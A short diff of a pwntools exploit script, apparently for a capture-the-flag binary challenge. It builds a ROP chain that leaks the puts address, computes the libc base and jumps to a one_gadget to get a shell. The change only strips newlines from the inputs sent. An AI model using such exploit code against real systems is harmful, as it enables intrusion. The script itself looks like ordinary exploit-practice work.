@@ -52,9 +52,9 @@ og = [324293,324386,1090444]
 main = 0x00000000004007d6
 # rop1
 
-se('1000000\n')
-se('1008857\n')
-se('6295576\n')
+se('1000000')
+se('1008857')
+se('6295576')
 se(p64(main))
 
 rc()
@@ -63,9 +63,9 @@ puts = eval(rc(14))
 libcbase = puts-libc.sym['puts']
 info_addr('libcabse',libcbase)
 
-se('1000000\n')
-se('2012376\n')
-se('6295576\n')
+se('1000000')
+se('2012376')
+se('6295576')
 debug()
 se(p64(libcbase+og[1]))
 
